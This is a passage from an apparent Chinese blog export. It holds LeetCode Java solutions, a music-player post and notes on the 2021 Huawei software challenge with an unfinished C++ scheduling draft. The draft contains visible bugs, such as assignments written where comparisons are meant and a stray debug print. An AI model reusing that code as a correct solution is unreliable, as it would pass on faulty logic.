class="keyword">else</span></span><br><span class="line">                ans.append(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是 <code>S</code> 的长度。</li>
<li>空间复杂度：$O(N)$。</li>
</ul>
<p><strong>方法 2：反转指针</strong></p>
<p><strong>想法</strong></p>
<p>一个接一个输出 <code>s</code> 的所有字符。当遇到一个字母时，我们希望找到逆序遍历字符串的下一个字母。</p>
<p>所以我们这么做：维护一个指针 <code>j</code> 从后往前遍历字符串，当需要字母时就使用它。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseOnlyLetters</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">        StringBuilder ans = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> j = S.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S.length(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Character.isLetter(S.charAt(i))) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!Character.isLetter(S.charAt(j)))</span><br><span class="line">                    j--;</span><br><span class="line">                ans.append(S.charAt(j--));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans.append(S.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(N)，其中 N 是 <code>S</code> 的长度。</li>
<li>空间复杂度：O(N)。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>嗯，字母栈方法也挺好的😮。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>听听歌吧</title>
    <url>/2021/03/17/%E5%90%AC%E5%90%AC%E6%AD%8C%E5%90%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>When you get tired of studying, just listen to some music!</p>
<a id="more"></a>

    <div id="aplayer-EIOfJfrs" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="001xLIXo2w9V7U" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

    <div id="aplayer-DxYUNwtI" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="362996" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

    <div id="aplayer-vxeuHOXj" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="362998" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

    <div id="aplayer-xZBdGgWy" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="1811921555" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

    <div id="aplayer-nNQwEgUk" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="165026" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

    <div id="aplayer-heRGHhtp" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="297587" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>

    <div id="aplayer-QaPkvmMw" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="297605" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>]]></content>
      <categories>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>歌曲</tag>
      </tags>
  </entry>
  <entry>
    <title>2021华为软件精英挑战赛</title>
    <url>/2021/03/19/2021%E5%8D%8E%E4%B8%BA%E8%BD%AF%E4%BB%B6%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://competition.huaweicloud.com/codecraft2021#introduction">【比赛地址】</a></p>
<p><a href="https://developer.huaweicloud.com/hero/thread-112802-1-1.html">【初赛赛题说明、技术Q&amp;A、练习赛数据集、SDK】</a></p>
<a id="more"></a>
<h4 id="比赛简介"><a href="#比赛简介" class="headerlink" title="比赛简介"></a>比赛简介</h4><h5 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h5><p>服务器类型</p>
<p>每台服务器存在A和B两个节点。</p>
<p><strong>参数：</strong></p>
<p>CPU核数、内存大小、硬件成本、能耗成本（没有部署虚拟机时没有能耗）</p>
<h5 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h5><p>虚拟机类型</p>
<p>单节点/双节点部署</p>
<h5 id="资源规划和调度"><a href="#资源规划和调度" class="headerlink" title="资源规划和调度"></a>资源规划和调度</h5><h6 id="请求类型"><a href="#请求类型" class="headerlink" title="请求类型"></a>请求类型</h6><p>创建虚拟机和删除虚拟机</p>
<h6 id="请求序列"><a href="#请求序列" class="headerlink" title="请求序列"></a>请求序列</h6><p>由一系列请求构成的序列，根据每天请求序列进行资源规划与调度</p>
<h6 id="数据中心扩容"><a href="#数据中心扩容" class="headerlink" title="数据中心扩容"></a>数据中心扩容</h6><p>根据请求序列购买新的服务器，购买的每台服务器从0开始递增编号，总量不超过$10^5$</p>
<h6 id="虚拟机迁移"><a href="#虚拟机迁移" class="headerlink" title="虚拟机迁移"></a>虚拟机迁移</h6><p>完成扩容，处理每一天的新请求之前把虚拟机从一台服务器迁移到另一台服务器，不超过虚拟机总量的千分之5</p>
<h6 id="部署虚拟机"><a href="#部署虚拟机" class="headerlink" title="部署虚拟机"></a>部署虚拟机</h6><p>指定部署在服务器的A节点或B节点</p>
<h5 id="输入示例说明"><a href="#输入示例说明" class="headerlink" title="输入示例说明"></a>输入示例说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;一个整数N(1&lt;&#x3D;N&lt;&#x3D;100)：可采购服务器类型数量</span><br><span class="line">2</span><br><span class="line">&#x2F;&#x2F;N行，每行描述一种类型的服务器(型号, CPU 核数, 内存大小, 硬件成本, 每日能耗成本)。</span><br><span class="line">(NV603, 92, 324, 53800, 500)</span><br><span class="line">(NV604, 128, 512, 87800, 800)</span><br><span class="line">&#x2F;&#x2F;一个整数M(1&lt;&#x3D;M&lt;&#x3D;1000):售卖的虚拟机类型数量</span><br><span class="line">2</span><br><span class="line">&#x2F;&#x2F;M行，每行描述一种类型虚拟机：(型号, CPU 核数, 内存大小, 是否双节点部署)，0表示单节点。</span><br><span class="line">(c3.large.4, 2, 8, 0)</span><br><span class="line">(c3.8xlarge.2, 32, 64, 1)</span><br><span class="line">&#x2F;&#x2F;一个整数T(1&lt;&#x3D;T&lt;&#x3D;1000)，T天</span><br><span class="line">3</span><br><span class="line">&#x2F;&#x2F;T组数据</span><br><span class="line">&#x2F;&#x2F;第一天，一个整数R(R&gt;&#x3D;0):R条请求</span><br><span class="line">2</span><br><span class="line">&#x2F;&#x2F;R行请求数据(add, 虚拟机型号, 虚拟机 ID)或(del, 虚拟机 ID)</span><br><span class="line">(add, c3.large.4, 5)</span><br><span class="line">(add, c3.large.4, 0)</span><br><span class="line">2</span><br><span class="line">(del, 0)</span><br><span class="line">(add, c3.8xlarge.2, 1)</span><br><span class="line">&#x2F;&#x2F;第T天</span><br><span class="line">3</span><br><span class="line">(add, c3.large.4, 2)</span><br><span class="line">(del, 1)</span><br><span class="line">(del, 2)</span><br></pre></td></tr></table></figure>
<h5 id="输出示例说明"><a href="#输出示例说明" class="headerlink" title="输出示例说明"></a>输出示例说明</h5><p>对于每 一天的操作，会先按顺序执行选手输出的购买操作，然后按顺序执行选手输出的迁移操作，最后 按顺序执行当天的创建和删除操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;输出按顺序包含T天中每一天的决策信息</span><br><span class="line">&#x2F;&#x2F;(purchase,Q),Q是购买服务器的类型数量(0&lt;&#x3D;Q&lt;&#x3D;N)</span><br><span class="line">(purchase, 2)</span><br><span class="line">&#x2F;&#x2F;Q行，每行(服务器型号，购买数量)</span><br><span class="line">(NV603, 1)</span><br><span class="line">(NV604, 1)</span><br><span class="line">&#x2F;&#x2F;(migration,W),W为迁移虚拟机的数量</span><br><span class="line">(migration, 0)</span><br><span class="line">&#x2F;&#x2F;W行，表示虚拟机迁移(虚拟机ID，目的服务器ID，(目的服务器节点--双节点部署则省略))</span><br><span class="line">&#x2F;&#x2F;对当天每个创建请求部署服务器，(服务器ID，(部署节点--双节点省略))</span><br><span class="line">(0, A)</span><br><span class="line">(0, B)</span><br><span class="line">&#x2F;&#x2F;下一天</span><br><span class="line">(purchase, 0)</span><br><span class="line">(migration, 0)</span><br><span class="line">(1)</span><br><span class="line">&#x2F;&#x2F;第T天</span><br><span class="line">(purchase, 0)</span><br><span class="line">(migration, 0)</span><br><span class="line">(1, B)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>先不考虑总成本，先写完程序满足请求序列</p>
<h5 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h5><p>怎么衡量每台服务器的性价比？</p>
<p>怎么选购服务器？</p>
<h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p>这两天稍微看了看，感觉就是一道复杂的ACM题，写了一点基础的代码，也没更多的时间去看了，我得去看论文了，先记录一下，以后有时间也许会研究一下。</p>
<p><strong>c++基础版代码（未考虑硬件成本）</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>read standard input</span></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>process</span></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>write standard output</span></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>fflush(stdout);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//以读模式打开文件</span></span><br><span class="line">	ifstream infile;</span><br><span class="line">	infile.open(<span class="string">&quot;./test_input.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">//N可采购服务器类型数量</span></span><br><span class="line">	<span class="keyword">int</span> N;</span><br><span class="line">	infile&gt;&gt;N;</span><br><span class="line">	<span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; server_type_list;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; server_random;</span><br><span class="line">    <span class="comment">//(NV603, 92, 324, 53800, 500)</span></span><br><span class="line">    <span class="built_in">string</span> key;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">	    <span class="comment">//对每种服务器类型数据进行解析</span></span><br><span class="line">	    <span class="comment">//获取服务器型号</span></span><br><span class="line">	    key=s.substr(<span class="number">1</span>,s.length()<span class="number">-2</span>);</span><br><span class="line">	    server_random.emplace_back(key);</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    <span class="comment">//cpu核数</span></span><br><span class="line">        arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">        infile&gt;&gt;s;</span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    <span class="comment">//内存大小</span></span><br><span class="line">	    arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    <span class="comment">//硬件成本</span></span><br><span class="line">	    arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    <span class="comment">//每日能耗成本</span></span><br><span class="line">	    arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">        server_type_list[key]=arr;</span><br><span class="line">        arr.clear();</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//售卖的虚拟机类型数量</span></span><br><span class="line">	<span class="keyword">int</span> M;</span><br><span class="line">	<span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; vm_type_list;</span><br><span class="line">	infile&gt;&gt;M;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">	    <span class="comment">//对每种虚拟机类型数据进行解析</span></span><br><span class="line">	    <span class="comment">//获取虚拟机型号</span></span><br><span class="line">	    key=s.substr(<span class="number">1</span>,s.length()<span class="number">-2</span>);</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    <span class="comment">//cpu核数</span></span><br><span class="line">        arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">        infile&gt;&gt;s;</span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    <span class="comment">//内存大小</span></span><br><span class="line">	    arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">	    infile&gt;&gt;s;</span><br><span class="line">        <span class="comment">//是否双节点部署</span></span><br><span class="line">	    s=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">	    arr.emplace_back(atoi(s.c_str()));</span><br><span class="line">        vm_type_list[key]=arr;</span><br><span class="line">        arr.clear();</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//T天</span></span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    infile&gt;&gt;T;</span><br><span class="line">    <span class="comment">//每天R条请求</span></span><br><span class="line">    <span class="keyword">int</span> R;</span><br><span class="line">    <span class="comment">//操作命令</span></span><br><span class="line">    <span class="built_in">string</span> op;</span><br><span class="line">    <span class="keyword">int</span> core_demand=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> memory_demand=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">string</span> vm_type;</span><br><span class="line">    <span class="keyword">int</span> vm_core=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> vm_memory=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> vm_id;</span><br><span class="line">    <span class="comment">//服务器空闲资源（key=服务器id,value=(A节点空闲核数，A节点内存，B核数，内存)）</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; free_server_list;</span><br><span class="line">    <span class="comment">//要购买的服务器</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; purchase_server;</span><br><span class="line">    <span class="keyword">int</span> free_memory=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> server_random_num;</span><br><span class="line">    <span class="keyword">int</span> purchase_server_type=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//是否双节点部署</span></span><br><span class="line">    <span class="keyword">int</span> deploy_type=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vm;</span><br><span class="line">    <span class="keyword">bool</span> fail_deploy=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; purchase_server_list;</span><br><span class="line">    <span class="comment">//部署服务器列表(服务器id，部署节点（双节点省略）)</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; deploy_server_list;</span><br><span class="line">    <span class="built_in">string</span> deploy_server=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//虚拟机ID与服务器编号和节点的映射(0/1/2--A/B/双,服务器编号)</span></span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; vm_server_map;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; server_num;</span><br><span class="line">    <span class="comment">//购买服务器的类型数量</span></span><br><span class="line">    <span class="keyword">int</span> Q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;T;i++)&#123;</span><br><span class="line">        <span class="comment">//处理每一天的请求序列</span></span><br><span class="line">        infile&gt;&gt;R;</span><br><span class="line">        <span class="comment">//先统计总共需要多少资源，然后输出购买信息</span></span><br><span class="line">        <span class="comment">//每天购买服务器类型初始为0</span></span><br><span class="line">        purchase_server_type=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;hello&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;R;k++)&#123;</span><br><span class="line">            infile&gt;&gt;op;</span><br><span class="line">            op=op.substr(<span class="number">1</span>,op.length()<span class="number">-2</span>);</span><br><span class="line">            <span class="keyword">if</span>(op==<span class="string">&quot;add&quot;</span>)&#123;</span><br><span class="line">                deploy_server=<span class="string">&quot;(&quot;</span>;</span><br><span class="line">                <span class="comment">//读取请求创建的虚拟机型号</span></span><br><span class="line">                infile&gt;&gt;s;</span><br><span class="line">                vm_type=s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>);</span><br><span class="line">                vm=vm_type_list[vm_type];</span><br><span class="line">                core_demand+=vm[<span class="number">0</span>];</span><br><span class="line">                memory_demand+=vm[<span class="number">1</span>];</span><br><span class="line">                <span class="comment">//是否双节点部署</span></span><br><span class="line">                deploy_type=vm[<span class="number">2</span>];</span><br><span class="line">                <span class="comment">//虚拟机ID</span></span><br><span class="line">                infile&gt;&gt;s;</span><br><span class="line">                vm_id=atoi(s.substr(<span class="number">0</span>,s.length()<span class="number">-1</span>).c_str());</span><br><span class="line">                <span class="keyword">while</span>(fail_deploy)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(deploy_type==<span class="number">0</span>)&#123;</span><br><span class="line">                            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;free_server_list.size();j++)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(free_server_list[j][<span class="number">0</span>]&gt;=core_demand &amp;&amp; free_server_list[j][<span class="number">1</span>]&gt;=memory_demand)&#123;</span><br><span class="line">                                    <span class="comment">//部署到编号为j的服务器的A节点上</span></span><br><span class="line">                                    free_server_list[j][<span class="number">0</span>]-=core_demand;</span><br><span class="line">                                    free_server_list[j][<span class="number">1</span>]-=memory_demand;</span><br><span class="line">                                    server_num.emplace_back(<span class="number">0</span>);</span><br><span class="line">                                    <span class="comment">//j转string</span></span><br><span class="line">                                    deploy_server+=to_string(j)+<span class="string">&quot;, A)&quot;</span>;</span><br><span class="line">                                    fail_deploy=<span class="literal">false</span>;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(free_server_list[j][<span class="number">2</span>]&gt;=core_demand &amp;&amp; free_server_list[j][<span class="number">3</span>]&gt;=memory_demand)&#123;</span><br><span class="line">                                    <span class="comment">//部署到编号为j的服务器的B节点上</span></span><br><span class="line">                                    free_server_list[j][<span class="number">2</span>]-=core_demand;</span><br><span class="line">                                    free_server_list[j][<span class="number">3</span>]-=memory_demand;</span><br><span class="line">                                    server_num.emplace_back(<span class="number">1</span>);</span><br><span class="line">                                    deploy_server+=to_string(j)+<span class="string">&quot;, B)&quot;</span>;</span><br><span class="line">                                    fail_deploy=<span class="literal">false</span>;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span>(j=free_server_list.size())&#123;</span><br><span class="line">                                <span class="comment">//部署失败需要购买服务器</span></span><br><span class="line">                                fail_deploy=<span class="literal">true</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                <span class="comment">//部署虚拟机时做好与服务器的映射</span></span><br><span class="line">                                server_num.emplace_back(j);</span><br><span class="line">                                server_num.emplace_back(core_demand);</span><br><span class="line">                                server_num.emplace_back(memory_demand);</span><br><span class="line">                                vm_server_map[vm_id]=server_num;</span><br><span class="line">                                server_num.clear();</span><br><span class="line">                                deploy_server_list.emplace_back(deploy_server);</span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//双节点部署</span></span><br><span class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;free_server_list.size();j++)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(free_server_list[j][<span class="number">0</span>]&gt;=core_demand/<span class="number">2</span> &amp;&amp; free_server_list[j][<span class="number">1</span>]&gt;=memory_demand/<span class="number">2</span> &amp;&amp; free_server_list[j][<span class="number">2</span>]&gt;=core_demand/<span class="number">2</span> &amp;&amp; free_server_list[j][<span class="number">3</span>]&gt;=memory_demand/<span class="number">2</span>)&#123;</span><br><span class="line">                                    <span class="comment">//部署到编号为j的服务器的A节点上</span></span><br><span class="line">                                    free_server_list[j][<span class="number">0</span>]-=core_demand/<span class="number">2</span>;</span><br><span class="line">                                    free_server_list[j][<span class="number">1</span>]-=memory_demand/<span class="number">2</span>;</span><br><span class="line">                                    free_server_list[j][<span class="number">2</span>]-=core_demand/<span class="number">2</span>;</span><br><span class="line">                                    free_server_list[j][<span class="number">3</span>]-=memory_demand/<span class="number">2</span>;</span><br><span class="line">                                    fail_deploy=<span class="literal">false</span>;</span><br><span class="line">                                    server_num.emplace_back(<span class="number">2</span>);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span>(j=free_server_list.size())&#123;</span><br><span class="line">                                <span class="comment">//部署失败需要购买服务器</span></span><br><span class="line">                                fail_deploy=<span class="literal">true</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                deploy_server+=to_string(j)+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">                                server_num.emplace_back(j);</span><br><span class="line">                                server_num.emplace_back(core_demand);</span><br><span class="line">                                server_num.emplace_back(memory_demand);</span><br><span class="line">                                vm_server_map[vm_id]=server_num;</span><br><span class="line">                                server_num.clear();</span><br><span class="line">                                deploy_server_list.emplace_back(deploy_server);</span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fail_deploy)&#123;</span><br><span class="line">                        <span class="comment">//随机购买一台服务器</span></span><br><span class="line">                        server_random_num=rand()%server_random.size();</span><br><span class="line">                        purchase_server.emplace_back(server_type_list[server_random[server_random_num]][<span class="number">0</span>]/<span class="number">2</span>);</span><br><span class="line">                        purchase_server.emplace_back(server_type_list[server_random[server_random_num]][<span class="number">1</span>]/<span class="number">2</span>);</span><br><span class="line">                        purchase_server.emplace_back(server_type_list[server_random[server_random_num]][<span class="number">0</span>]/<span class="number">2</span>);</span><br><span class="line">                        purchase_server.emplace_back(server_type_list[server_random[server_random_num]][<span class="number">1</span>]/<span class="number">2</span>);</span><br><span class="line">                        <span class="comment">//将购买的这台服务器放到空闲服务器列表中</span></span><br><span class="line">                        free_server_list.emplace_back(purchase_server);</span><br><span class="line">                        <span class="comment">//对应的购买服务器型号数量加1</span></span><br><span class="line">                        purchase_server_list[server_random[server_random_num]]++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//删除虚拟机请求</span></span><br><span class="line">                <span class="comment">//获取要删除的虚拟机id</span></span><br><span class="line">                infile&gt;&gt;s;</span><br><span class="line">                vm_id=atoi(s.substr(<span class="number">1</span>,s.length()<span class="number">-2</span>).c_str());</span><br><span class="line">                <span class="comment">//根据部署映射获取虚拟机部署所依托的服务器编号和节点</span></span><br><span class="line">                <span class="comment">//然后把删除虚拟机的资源加到空闲服务器资源中</span></span><br><span class="line">                <span class="keyword">if</span>(vm_server_map[vm_id][<span class="number">0</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">0</span>]+=vm_server_map[vm_id][<span class="number">2</span>];</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">1</span>]+=vm_server_map[vm_id][<span class="number">3</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(vm_server_map[vm_id][<span class="number">0</span>]=<span class="number">1</span>)&#123;</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">2</span>]+=vm_server_map[vm_id][<span class="number">2</span>];</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">3</span>]+=vm_server_map[vm_id][<span class="number">3</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">0</span>]+=vm_server_map[vm_id][<span class="number">2</span>]/<span class="number">2</span>;</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">1</span>]+=vm_server_map[vm_id][<span class="number">3</span>]/<span class="number">2</span>;</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">2</span>]+=vm_server_map[vm_id][<span class="number">2</span>]/<span class="number">2</span>;</span><br><span class="line">                    free_server_list[vm_server_map[vm_id][<span class="number">1</span>]][<span class="number">2</span>]+=vm_server_map[vm_id][<span class="number">3</span>]/<span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出每天的决策信息</span></span><br><span class="line">        <span class="comment">//输出购买服务器的类型数量Q</span></span><br><span class="line">        Q=purchase_server_list.size();</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;(purchase, &quot;</span>&lt;&lt;Q&lt;&lt;<span class="string">&quot;)&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">//遍历购买的服务器类型和数量</span></span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt;::iterator iter;</span><br><span class="line">        <span class="keyword">for</span>(iter=purchase_server_list.begin();iter!=purchase_server_list.end();iter++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;(&quot;</span>&lt;&lt;iter-&gt;first&lt;&lt;<span class="string">&quot;, &quot;</span>&lt;&lt;iter-&gt;second&lt;&lt;<span 